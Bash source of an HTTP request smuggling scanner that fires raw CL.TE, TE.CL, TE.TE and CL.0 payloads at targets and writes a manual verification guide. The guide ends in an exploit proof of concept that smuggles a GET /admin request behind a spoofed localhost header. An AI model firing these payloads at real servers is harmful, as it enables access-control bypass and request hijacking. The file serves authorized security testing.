#!/usr/bin/env bash
# =============================================================================
#  HTTPSmuggler Ultimate v2.0
#  HTTP Request Smuggling Detection & Verification Framework
#  github.com/mohidqx/HTTPsmuggle
#  Author: mohidqx  |  Authorized targets only. You own the liability.
# =============================================================================

VERSION="1.0.0"
GITHUB_REPO="mohidqx/HTTPsmuggle"
GITHUB_RAW="https://raw.githubusercontent.com/${GITHUB_REPO}/main/smuggler.sh"
SCRIPT_PATH="$(realpath "$0" 2>/dev/null || echo "$0")"
TEMP_DIR=""
RESULTS_FILE="smuggler_results.txt"
JSON_FILE="smuggler_results.json"
GUIDE_FILE="smuggler_manual_guide.md"
START_TIME=$(date +%s)

VULN_COUNT=0
SCAN_COUNT=0
declare -a VULN_LIST=()
declare -a PAYLOAD_NAMES=()
declare -A PAYLOADS

# ── Colors ──────────────────────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'
C='\033[0;36m'; M='\033[0;35m'; W='\033[1;37m'; DIM='\033[2m'; NC='\033[0m'
BOLD='\033[1m'

# ── Defaults ─────────────────────────────────────────────────────────────────
TIMEOUT_BASELINE=8
TIMEOUT_TIMING=13     # Must be > normal response; timing attacks rely on backend hang
TIMEOUT_DIFF=7
VERIFY_ROUNDS=5
VERIFY_THRESHOLD=4    # 4/5 = 80% confidence
INTER_DELAY=1
VERBOSE=false
JSON_OUT=false
SHOW_GUIDE=false
QUICK_MODE=false
SKIP_UPDATE=false
CUSTOM_PATH="/"
USE_TLS=true          # default assume HTTPS; adjusted per target
TARGET_FILE=""
THREADS=1
PROXY_HOST=""
PROXY_PORT=""
BASELINE_MS=0
LIST_PAYLOADS=false

# ─── Cleanup ──────────────────────────────────────────────────────────────────
cleanup() {
    [[ -n "$TEMP_DIR" ]] && rm -rf "$TEMP_DIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

init_temp() {
    TEMP_DIR=$(mktemp -d /tmp/smuggler_XXXXXX 2>/dev/null) || {
        error "Failed to create temp directory"
        exit 1
    }
}

# ─── Logging ─────────────────────────────────────────────────────────────────
log()     { [[ "$VERBOSE" == true ]] && echo -e "  ${DIM}[dbg] $*${NC}" >&2; }
info()    { echo -e "  ${B}[*]${NC} $*"; }
success() { echo -e "  ${G}[+]${NC} $*"; }
warn()    { echo -e "  ${Y}[!]${NC} $*"; }
error()   { echo -e "  ${R}[✗]${NC} $*" >&2; }
vuln_msg(){ echo -e "  ${R}${BOLD}[VULNERABLE]${NC} ${W}$*${NC}"; }
safe_msg(){ echo -e "  ${G}[SAFE]${NC}"; }

# ─── Banner ───────────────────────────────────────────────────────────────────
banner() {
    echo -e "${DIM}${BOLD}"
    echo '  ╔═════════════════════════════════════════════╗'
    echo -e "  ║  ${NC}${W}        HTTP Request Smuggling${NC}${DIM}${BOLD}             ║"
    echo -e "  ║  ${NC}${C}v${VERSION}${NC}${DIM}  │  github.com/${GITHUB_REPO}${NC}${DIM}${BOLD}  ║"
    echo '  ╚═════════════════════════════════════════════╝'
    echo -e "${NC}"
    echo -e "  ${R}⚠  Only test targets you have explicit written authorization to scan.${NC}\n"
}

# ─── Usage ────────────────────────────────────────────────────────────────────
usage() {
    echo -e "${W}Usage:${NC}"
    echo -e "  ${C}$0${NC}${DIM} [options] <target>${NC}"
    echo -e "  ${C}$0${NC}${DIM} [options] -f <targets_file>\n${NC}"
    echo -e "${W}Target Formats:${NC}"
    echo -e "  ${G}target.com${NC}${DIM}              HTTPS :443 (default)"
    echo -e "  ${G}target.com:8443${NC}${DIM}         Custom port (TLS)"
    echo -e "  ${G}target.com:80${NC}${DIM}           HTTP plain (auto-detected)"
    echo -e "  ${G}https://api.target.com${NC}${DIM}  From full URL\n"
    echo -e "${W}Options:${NC}"
    printf "  ${C}%-22s${NC} %s\n" "-f <file>"        "Bulk scan; one target per line (# for comments)"
    printf "  ${C}%-22s${NC} %s\n" "-p <path>"        "Request path (default: /)"
    printf "  ${C}%-22s${NC} %s\n" "-t <seconds>"     "Timing timeout per test (default: 13)"
    printf "  ${C}%-22s${NC} %s\n" "-T <threads>"     "Parallel threads for bulk mode (default: 1)"
    printf "  ${C}%-22s${NC} %s\n" "--proxy <h:p>"    "HTTP proxy for requests"
    printf "  ${C}%-22s${NC} %s\n" "--quick"          "Skip multi-round verification (faster, less accurate)"
    printf "  ${C}%-22s${NC} %s\n" "-v"               "Verbose / debug output"
    printf "  ${C}%-22s${NC} %s\n" "-j"               "Write JSON results to ${JSON_FILE}"
    printf "  ${C}%-22s${NC} %s\n" "-g"               "Generate manual verification guide"
    printf "  ${C}%-22s${NC} %s\n" "-u"               "Skip auto-update check"
    printf "  ${C}%-22s${NC} %s\n" "--payloads"       "List all payloads and categories"
    printf "  ${C}%-22s${NC} %s\n" "-h, --help"       "Show this help\n"
    echo -e "${W}Examples:${NC}"
    echo -e "  $0 target.com"
    echo -e "  $0 -v -g -j target.com"
    echo -e "  $0 -f targets.txt -T 5 -j -g"
    echo -e "  $0 -p /api/upload --quick target.com:8080\n"
}

# ─── Payload Library ──────────────────────────────────────────────────────────
# Detection strategy: TIMING = backend hangs → we measure timeout/delay
#                     DIFF   = differential response on follow-up canary request
add_payload() {
    local name=$1 category=$2 strategy=$3 desc=$4 payload=$5
    PAYLOADS["${name}|cat"]="$category"
    PAYLOADS["${name}|strategy"]="$strategy"
    PAYLOADS["${name}|desc"]="$desc"
    PAYLOADS["${name}|payload"]="$payload"
    PAYLOAD_NAMES+=("$name")
}

init_payloads() {
    # ── CL.TE: Frontend=Content-Length, Backend=Transfer-Encoding ─────────────
    # Backend waits for chunked terminator that never arrives → TIMEOUT
    add_payload "CLTE-BASIC" "CL.TE" "TIMING" \
        "Classic CL.TE: frontend reads CL, backend expects more chunks" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\n'

    add_payload "CLTE-GPOST" "CL.TE" "DIFF" \
        "CL.TE differential: poison socket to prepend G to next request" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG'

    # ── TE.CL: Frontend=Transfer-Encoding, Backend=Content-Length ─────────────
    # Backend told CL=large but frontend only forwards chunked body → backend waits
    add_payload "TECL-BASIC" "TE.CL" "TIMING" \
        "Classic TE.CL: backend uses CL=100, gets only chunked 0-terminator → hangs" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\n'

    add_payload "TECL-LARGE-CL" "TE.CL" "TIMING" \
        "TE.CL with CL=65535: forces longer hang to distinguish from noise" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 65535\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\n'

    add_payload "TECL-GPOST" "TE.CL" "DIFF" \
        "TE.CL differential: smuggle GPOST prefix to poison next request" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGPOST %PATH% HTTP/1.1\r\n\r\n0\r\n\r\n'

    # ── TE.TE: Both support TE but one can be confused by obfuscation ──────────
    # The obfuscated TE header makes one side ignore/misparse it
    add_payload "TETE-IDENTITY" "TE.TE" "TIMING" \
        "Duplicate TE: chunked + identity; proxy uses first, backend may use second" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-XCHUNKED" "TE.TE" "TIMING" \
        "TE obfuscation: 'xchunked' accepted by some servers, ignored by others" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: xchunked\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-SPACE-PREFIX" "TE.TE" "TIMING" \
        "TE obfuscation: leading space in value (RFC violation, passes many WAFs)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding:  chunked\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-TAB" "TE.TE" "TIMING" \
        "TE obfuscation: tab separator before value (old Apache quirk)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-UPPERCASE" "TE.TE" "TIMING" \
        "TE obfuscation: CHUNKED uppercase (case-sensitive backends)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: CHUNKED\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-COLON-SPACE" "TE.TE" "TIMING" \
        "TE obfuscation: space before colon (malformed header, RFC violation)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-COMMA-IDENTITY" "TE.TE" "TIMING" \
        "TE obfuscation: comma list 'chunked,identity' (RFC-ish, parses differently)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked,identity\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-INVALID-EXT" "TE.TE" "TIMING" \
        "TE obfuscation: chunked with invalid extension param (WAF bypass)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked;ext=smuggler\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-FOLD" "TE.TE" "TIMING" \
        "TE obfuscation: header folding (deprecated but some servers still process)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding:\r\n\tchunked\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-METHOD-OVERRIDE" "TE.TE" "TIMING" \
        "TE + X-HTTP-Method-Override TRACE (some proxies rewrite the method)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nX-HTTP-Method-Override: TRACE\r\n\r\n1\r\nZ\r\n'

    add_payload "TETE-X-TE" "TE.TE" "TIMING" \
        "X-Transfer-Encoding: chunked (non-standard; some CDNs forward it to origin)" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nX-Transfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n'

    # ── CL.0: Backend ignores body for specific endpoint types ────────────────
    # Modern technique: GET/HEAD with body; some backends treat these as CL=0
    add_payload "CL0-POST" "CL.0" "DIFF" \
        "CL.0 POST: backend ignores body on this endpoint, smuggles next request" \
        'POST %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 30\r\nConnection: keep-alive\r\n\r\nGET /cl0-canary HTTP/1.1\r\nX-Foo: bar'

    add_payload "CL0-GET" "CL.0" "DIFF" \
        "CL.0 GET with body: some backends ignore body on GET, treating as CL=0" \
        'GET %PATH% HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 30\r\nConnection: keep-alive\r\n\r\nGET /cl0-canary HTTP/1.1\r\nX-Foo: bar'
}

list_payloads() {
    echo -e "\n${W}${BOLD} Payload Library (${#PAYLOAD_NAMES[@]} payloads)${NC}\n"
    local last_cat=""
    for name in "${PAYLOAD_NAMES[@]}"; do
        local cat="${PAYLOADS[${name}|cat]}"
        local strat="${PAYLOADS[${name}|strategy]}"
        local desc="${PAYLOADS[${name}|desc]}"
        if [[ "$cat" != "$last_cat" ]]; then
            echo -e "  ${M}${BOLD}── $cat ─────────────────────────────────────${NC}"
            last_cat="$cat"
        fi
        local strat_color="$Y"
        [[ "$strat" == "DIFF" ]] && strat_color="$C"
        echo -e "  ${W}${name}${NC}"
        echo -e "    ${strat_color}[${strat}]${NC}  ${DIM}${desc}${NC}"
    done
    echo ""
}

# ─── Auto-Update ─────────────────────────────────────────────────────────────
check_update() {
    [[ "$SKIP_UPDATE" == true ]] && return
    command -v curl >/dev/null 2>&1 || return

    info "Checking for updates from github.com/${GITHUB_REPO} ..."
    local remote_version
    remote_version=$(curl -sf --max-time 5 "$GITHUB_RAW" 2>/dev/null | grep '^VERSION=' | head -1 | cut -d'"' -f2)

    if [[ -z "$remote_version" ]]; then
        log "Update check failed (no network or repo not found)"
        return
    fi

    if [[ "$remote_version" != "$VERSION" ]]; then
        warn "Update available: ${Y}v${remote_version}${NC} (current: v${VERSION})"
        echo -ne "  ${C}Auto-update? [y/N]:${NC} "
        read -r answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
            local tmp_update
            tmp_update=$(mktemp /tmp/smuggler_update_XXXXXX.sh)
            if curl -sf --max-time 15 "$GITHUB_RAW" -o "$tmp_update"; then
                chmod +x "$tmp_update"
                cp "$tmp_update" "$SCRIPT_PATH" && rm -f "$tmp_update"
                success "Updated to v${remote_version}. Re-run the script."
                exit 0
            else
                error "Download failed. Manual update: curl -O $GITHUB_RAW"
                rm -f "$tmp_update"
            fi
        fi
    else
        log "Already latest version (v${VERSION})"
    fi
}

# ─── Network Helpers ─────────────────────────────────────────────────────────
parse_target() {
    local raw=$1
    local host="" port="" tls=true

    if [[ "$raw" =~ ^https?:// ]]; then
        [[ "$raw" =~ ^http:// ]] && tls=false
        host=$(echo "$raw" | sed -E 's|^https?://([^/:?#]+).*|\1|')
        # Extract port only if explicitly present in the URL
        if echo "$raw" | grep -qE ":[0-9]+(/|$|\?)"; then
            port=$(echo "$raw" | sed -E 's|^https?://[^/:?#]+:([0-9]+).*|\1|')
        fi
        [[ -z "$port" ]] && { [[ "$tls" == true ]] && port=443 || port=80; }
    elif [[ "$raw" =~ : ]]; then
        host="${raw%%:*}"
        port="${raw##*:}"
        [[ "$port" == "80" ]] && tls=false
    else
        host="$raw"
        port=443
    fi

    [[ -z "$host" ]] && return 1
    echo "${host}|${port}|${tls}"
}

# Core raw send — returns exit code via stdout, response in output_file
send_raw() {
    local host=$1 port=$2 tls=$3 payload=$4 timeout_val=$5 outfile=$6
    local exit_code

    if [[ "$tls" == true ]]; then
        printf "%b" "$payload" | timeout "$timeout_val" openssl s_client \
            -connect "${host}:${port}" \
            -servername "$host" \
            -quiet \
            -no_ign_eof \
            2>/dev/null > "$outfile"
        exit_code=$?
    else
        if command -v nc >/dev/null 2>&1; then
            printf "%b" "$payload" | timeout "$timeout_val" nc -q2 "$host" "$port" > "$outfile" 2>/dev/null
        else
            printf "%b" "$payload" | timeout "$timeout_val" bash -c \
                "exec 3<>/dev/tcp/${host}/${port}; cat >&3; cat <&3" > "$outfile" 2>/dev/null
        fi
        exit_code=$?
    fi

    echo $exit_code
}

# Measure baseline response time in ms (for timing delta detection)
get_baseline() {
    local host=$1 port=$2 tls=$3
    local tmp="${TEMP_DIR}/baseline_$$"
    local payload="HEAD ${CUSTOM_PATH} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n"

    local t0 t1 code
    t0=$(date +%s%3N)
    code=$(send_raw "$host" "$port" "$tls" "$payload" "$TIMEOUT_BASELINE" "$tmp")
    t1=$(date +%s%3N)

    if [[ "$code" -eq 124 ]]; then
        log "Baseline: connection timed out"
        echo "TIMEOUT"
        return
    fi
    if ! grep -q "HTTP" "$tmp" 2>/dev/null; then
        log "Baseline: no HTTP response"
        echo "FAIL"
        return
    fi
    BASELINE_MS=$((t1 - t0))
    log "Baseline response: ${BASELINE_MS}ms"
    echo "OK"
}

# ─── Detection Methods ────────────────────────────────────────────────────────

# TIMING detection: a vulnerable backend HANGS waiting for more data
# → our request times out OR takes significantly longer than baseline
# Returns: 0=not timing-vuln, 1=timing-vuln detected
test_timing() {
    local host=$1 port=$2 tls=$3 payload=$4
    local tmp="${TEMP_DIR}/timing_$$_${RANDOM}"
    local t0 t1 elapsed code

    t0=$(date +%s%3N)
    code=$(send_raw "$host" "$port" "$tls" "$payload" "$TIMEOUT_TIMING" "$tmp")
    t1=$(date +%s%3N)
    elapsed=$((t1 - t0))

    log "Timing test: code=${code} elapsed=${elapsed}ms baseline=${BASELINE_MS}ms"

    # Timeout = backend hung = timing vulnerability confirmed
    if [[ $code -eq 124 ]]; then
        log "→ TIMEOUT: backend is hanging"
        return 0
    fi

    # Significantly delayed response also indicates hang (backend sent error after timeout)
    # Threshold: baseline + 5000ms or elapsed > 7000ms
    local threshold=$(( BASELINE_MS + 5000 ))
    if [[ $elapsed -gt $threshold ]] || [[ $elapsed -gt 7000 ]]; then
        log "→ DELAYED (${elapsed}ms): likely backend hang"
        return 0
    fi

    # Fast response = server rejected/processed normally = NOT a timing vuln here
    return 1
}

# DIFFERENTIAL detection: sends poison then canary, checks for changed response
# Returns: 0=not vuln, 1=differential detected (canary got unexpected response)
test_differential() {
    local host=$1 port=$2 tls=$3 payload=$4
    local tmp_poison="${TEMP_DIR}/diff_poison_$$_${RANDOM}"
    local tmp_canary="${TEMP_DIR}/diff_canary_$$_${RANDOM}"

    # Send the poison request (short timeout, just needs to land)
    send_raw "$host" "$port" "$tls" "$payload" 5 "$tmp_poison" >/dev/null 2>&1

    # Immediately fire canary on new connection
    local canary_path="/smuggler-canary-$(date +%s)"
    local canary="GET ${canary_path} HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n"
    send_raw "$host" "$port" "$tls" "$canary" "$TIMEOUT_DIFF" "$tmp_canary" >/dev/null 2>&1

    # Normal 404 canary response is expected. If we get a 4xx due to malformed
    # request (method missing, invalid path prefix from smuggled bytes), that's
    # the differential indicator.
    if [[ ! -s "$tmp_canary" ]]; then
        log "Differential: canary got no response"
        return 1
    fi

    local status
    status=$(grep -oP 'HTTP/1\.\d \K[0-9]+' "$tmp_canary" | head -1)
    log "Differential canary status: ${status}"

    # 400 Bad Request = likely the canary method got the smuggled prefix prepended
    if [[ "$status" == "400" ]]; then
        log "→ DIFFERENTIAL: canary got 400 (smuggled prefix likely prepended)"
        return 0
    fi

    # 405 = method not allowed (GPOST / GGET method → server rejects unknown method)
    if [[ "$status" == "405" ]]; then
        log "→ DIFFERENTIAL: canary got 405 (method override = smuggling confirmed)"
        return 0
    fi

    # Compare canary response size to baseline — major difference is suspicious
    local canary_size
    canary_size=$(wc -c < "$tmp_canary" 2>/dev/null || echo 0)
    log "Canary response size: ${canary_size} bytes"

    return 1
}

# Run appropriate detection based on payload strategy
detect_once() {
    local host=$1 port=$2 tls=$3 name=$4
    local strategy="${PAYLOADS[${name}|strategy]}"
    local raw_payload="${PAYLOADS[${name}|payload]}"
    local payload="${raw_payload//%HOST%/$host}"
    payload="${payload//%PATH%/$CUSTOM_PATH}"

    if [[ "$strategy" == "TIMING" ]]; then
        test_timing "$host" "$port" "$tls" "$payload"
    elif [[ "$strategy" == "DIFF" ]]; then
        test_differential "$host" "$port" "$tls" "$payload"
    else
        test_timing "$host" "$port" "$tls" "$payload"
    fi
}

# Multi-round verification to eliminate false positives
verify_vuln() {
    local host=$1 port=$2 tls=$3 name=$4
    local hits=0

    [[ "$QUICK_MODE" == true ]] && VERIFY_ROUNDS=2 && VERIFY_THRESHOLD=2

    for ((i = 1; i <= VERIFY_ROUNDS; i++)); do
        log "Verification round $i/${VERIFY_ROUNDS}"
        if detect_once "$host" "$port" "$tls" "$name"; then
            ((hits++))
        fi
        sleep "$INTER_DELAY"
    done

    log "Verification: $hits/${VERIFY_ROUNDS} positive rounds"
    [[ $hits -ge $VERIFY_THRESHOLD ]]
}

# ─── Scan Target ─────────────────────────────────────────────────────────────
scan_target() {
    local raw_target=$1
    local parsed
    parsed=$(parse_target "$raw_target") || {
        error "Invalid target: $raw_target"
        return 1
    }

    local host port tls
    host="${parsed%%|*}"
    port="${parsed#*|}"
    port="${port%|*}"
    tls="${parsed##*|}"

    echo ""
    echo -e "  ${B}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${W}TARGET${NC}  ${C}${host}:${port}${NC}  ${DIM}[TLS:${tls}]  [Path:${CUSTOM_PATH}]${NC}"
    echo -e "  ${B}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    ((SCAN_COUNT++))
    local target_vulns=()

    # Baseline check
    echo -ne "  ${DIM}[baseline]${NC} Connecting... "
    local baseline_status
    baseline_status=$(get_baseline "$host" "$port" "$tls")

    if [[ "$baseline_status" == "FAIL" ]]; then
        echo -e "${R}FAILED${NC} — cannot reach target, skipping"
        return 1
    elif [[ "$baseline_status" == "TIMEOUT" ]]; then
        echo -e "${Y}TIMEOUT${NC} — connection timed out at baseline, skipping"
        return 1
    else
        echo -e "${G}OK${NC}  ${DIM}(${BASELINE_MS}ms)${NC}"
    fi

    local last_cat=""
    for name in "${PAYLOAD_NAMES[@]}"; do
        local cat="${PAYLOADS[${name}|cat]}"
        local desc="${PAYLOADS[${name}|desc]}"
        local strategy="${PAYLOADS[${name}|strategy]}"

        if [[ "$cat" != "$last_cat" ]]; then
            echo ""
            echo -e "  ${M}${BOLD}▸ ${cat}${NC}"
            last_cat="$cat"
        fi

        local strat_badge="${Y}[T]${NC}"
        [[ "$strategy" == "DIFF" ]] && strat_badge="${C}[D]${NC}"

        printf "  ${DIM}%-24s${NC} %b " "$name" "$strat_badge"

        # Initial probe
        if detect_once "$host" "$port" "$tls" "$name"; then
            echo -ne "${Y}Potential...${NC} "

            if [[ "$QUICK_MODE" == true ]]; then
                # One more probe for quick mode
                if detect_once "$host" "$port" "$tls" "$name"; then
                    echo -e "${R}${BOLD}VULNERABLE${NC} ${DIM}(quick mode)${NC}"
                    target_vulns+=("$name")
                    ((VULN_COUNT++))
                    echo "${host}:${port} | ${name} | ${strategy} | $(date -u +%FT%TZ)" >> "$RESULTS_FILE"
                else
                    echo -e "${G}SAFE${NC}"
                fi
            else
                # Full multi-round verification
                echo -ne "${DIM}verifying (${VERIFY_ROUNDS}x)...${NC} "
                if verify_vuln "$host" "$port" "$tls" "$name"; then
                    echo -e "${R}${BOLD}VULNERABLE ✓${NC}"
                    target_vulns+=("$name")
                    ((VULN_COUNT++))
                    VULN_LIST+=("${host}:${port}|${name}|${cat}|${strategy}")
                    echo "${host}:${port} | ${name} | ${cat} | ${strategy} | $(date -u +%FT%TZ)" >> "$RESULTS_FILE"
                else
                    echo -e "${G}SAFE${NC}  ${DIM}(not consistent)${NC}"
                fi
            fi
        else
            echo -e "${G}SAFE${NC}"
        fi
    done

    echo ""

    # Per-target summary
    if [[ ${#target_vulns[@]} -gt 0 ]]; then
        echo -e "  ${R}${BOLD}⚑ VULNERABLE:${NC} ${host}:${port}"
        for v in "${target_vulns[@]}"; do
            echo -e "    ${R}•${NC} ${v}  ${DIM}(${PAYLOADS[${v}|desc]})${NC}"
        done

        # Auto-generate guide if flag set
        [[ "$SHOW_GUIDE" == true ]] && generate_manual_guide "$host" "$port" "${target_vulns[@]}"
    else
        echo -e "  ${G}✓ No vulnerabilities confirmed for ${host}:${port}${NC}"
    fi
}

# ─── Manual Verification Guide Generator ─────────────────────────────────────
generate_manual_guide() {
    local host=$1 port=$2
    shift 2
    local vulns=("$@")

    {
        echo "# HTTP Request Smuggling — Manual Verification Guide"
        echo "# Target: ${host}:${port}"
        echo "# Generated: $(date -u +%FT%TZ)"
        echo "# Tool: HTTPSmuggler Ultimate v${VERSION}"
        echo ""

        echo "## Overview"
        echo ""
        echo "Automated scans found potential smuggling vectors. The steps below"
        echo "let you manually confirm each finding using Burp Suite Repeater,"
        echo "curl raw mode, or netcat. Follow the golden rule:"
        echo ""
        echo "  1. Send the POISON request"
        echo "  2. Immediately send the CANARY request on a NEW connection"
        echo "  3. If canary receives an unexpected/modified response → CONFIRMED"
        echo ""

        for vname in "${vulns[@]}"; do
            local cat="${PAYLOADS[${vname}|cat]}"
            local strat="${PAYLOADS[${vname}|strategy]}"
            local desc="${PAYLOADS[${vname}|desc]}"

            echo "---"
            echo ""
            echo "## Vector: ${vname}  [${cat}]"
            echo ""
            echo "**Description:** ${desc}"
            echo "**Detection strategy:** ${strat}"
            echo ""

            case "$cat" in
            CL.TE)
                echo "### Step 1 — Timing Confirmation"
                echo ""
                echo "Send this request and observe response time. A 5–30 second delay"
                echo "or timeout indicates the backend is hanging waiting for chunk data."
                echo ""
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Length: 4"
                echo "Transfer-Encoding: chunked"
                echo ""
                echo "1"
                echo "Z"
                echo '```'
                echo ""
                echo "### Step 2 — Differential Response (Burp Repeater)"
                echo ""
                echo "In Burp Repeater, disable 'Update Content-Length'."
                echo "Send POISON request, then immediately send CANARY."
                echo ""
                echo "**POISON (send first):**"
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Type: application/x-www-form-urlencoded"
                echo "Content-Length: 6"
                echo "Transfer-Encoding: chunked"
                echo ""
                echo "0"
                echo ""
                echo "G"
                echo '```'
                echo ""
                echo "**CANARY (send immediately after on new tab):**"
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Type: application/x-www-form-urlencoded"
                echo "Content-Length: 6"
                echo ""
                echo "x=abc"
                echo '```'
                echo ""
                echo "**Expected if VULNERABLE:** The canary response shows a 400/403/405"
                echo "or you see your 'G' appear as a garbled method in the response."
                echo ""
                echo "### Step 3 — Full Exploit PoC"
                echo ""
                echo "Replace 'G' with a full request you want smuggled, e.g.:"
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Length: 116"
                echo "Transfer-Encoding: chunked"
                echo ""
                echo "0"
                echo ""
                echo "GET /admin HTTP/1.1"
                echo "Host: ${host}"
                echo "X-Forwarded-For: 127.0.0.1"
                echo "Content-Length: 10"
                echo ""
                echo "x="
                echo '```'
                ;;

            TE.CL)
                echo "### Step 1 — Timing Confirmation"
                echo ""
                echo "Send this request. Backend uses Content-Length=100 but only receives"
                echo "the chunked terminator (~7 bytes). It waits for remaining 93 bytes."
                echo "Observe a hang or delayed 408 response."
                echo ""
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Length: 100"
                echo "Transfer-Encoding: chunked"
                echo ""
                echo "0"
                echo ""
                echo '```'
                echo ""
                echo "### Step 2 — Differential Response"
                echo ""
                echo "**POISON:**"
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Length: 4"
                echo "Transfer-Encoding: chunked"
                echo ""
                echo "12"
                echo "GPOST / HTTP/1.1"
                echo ""
                echo "0"
                echo ""
                echo '```'
                echo ""
                echo "**CANARY (new connection, immediately after):**"
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Length: 6"
                echo ""
                echo "x=abc"
                echo '```'
                echo ""
                echo "**Expected if VULNERABLE:** 403/405 'GPOST method not allowed'"
                ;;

            TE.TE)
                echo "### Approach for TE.TE Obfuscation Variant"
                echo ""
                echo "Identify WHICH side ignores the obfuscated TE header:"
                echo "- If FRONTEND ignores it → backend processes TE → reduces to CL.TE"
                echo "- If BACKEND ignores it  → frontend processes TE → reduces to TE.CL"
                echo ""
                echo "**Test payload (${vname}):**"
                local p="${PAYLOADS[${vname}|payload]}"
                p="${p//%HOST%/$host}"
                p="${p//%PATH%//}"
                # Print the payload in readable form
                echo '```'
                echo "$p" | sed 's/\\r\\n/\n/g'
                echo '```'
                echo ""
                echo "After identifying which type it reduces to, follow the CL.TE or"
                echo "TE.CL manual steps above."
                ;;

            CL.0)
                echo "### CL.0 Manual Verification"
                echo ""
                echo "CL.0 works when the backend ignores the request body for certain"
                echo "endpoints (static files, GET requests, health checks)."
                echo ""
                echo "**Step 1 — Find an endpoint where backend ignores body:**"
                echo "  - Try: /, /static/*, /health, /favicon.ico, GET endpoints"
                echo ""
                echo "**Step 2 — Send poison + canary on SAME connection:**"
                echo '```http'
                echo "POST / HTTP/1.1"
                echo "Host: ${host}"
                echo "Content-Length: 35"
                echo "Connection: keep-alive"
                echo ""
                echo "GET /hopefully-404 HTTP/1.1"
                echo "X-Ignore: x"
                echo '```'
                echo ""
                echo "Immediately send (same connection):"
                echo '```http'
                echo "GET / HTTP/1.1"
                echo "Host: ${host}"
                echo ""
                echo '```'
                echo ""
                echo "**Expected if VULNERABLE:** Second response contains content from"
                echo "the smuggled /hopefully-404 request."
                ;;
            esac

            echo ""
            echo "### Burp Suite Turbo Intruder Script (for confirming via race)"
            echo '```python'
            echo "def queueRequests(target, wordlists):"
            echo "    engine = RequestEngine(endpoint=target.endpoint,"
            echo "        concurrentConnections=5, requestsPerConnection=1,"
            echo "        pipeline=False)"
            echo "    # Poison"
            echo "    engine.queue(target.req, gate='race1')"
            echo "    # Canaries"
            echo "    for i in range(5):"
            echo "        engine.queue(target.req2, gate='race1')"
            echo "    engine.openGate('race1')"
            echo ""
            echo "def handleResponse(req, interesting):"
            echo "    if req.status != 404:"
            echo "        table.add(req)"
            echo '```'
            echo ""
        done

        echo "---"
        echo ""
        echo "## Tools for Manual Verification"
        echo ""
        echo "| Tool                 | Purpose                                         |"
        echo "|----------------------|-------------------------------------------------|"
        echo "| Burp Suite Repeater  | Send/compare raw requests with full control     |"
        echo "| Burp Turbo Intruder  | Race condition & multi-request verification     |"
        echo "| HTTP Request Smuggler| Burp extension (auto-detect + PoC generation)   |"
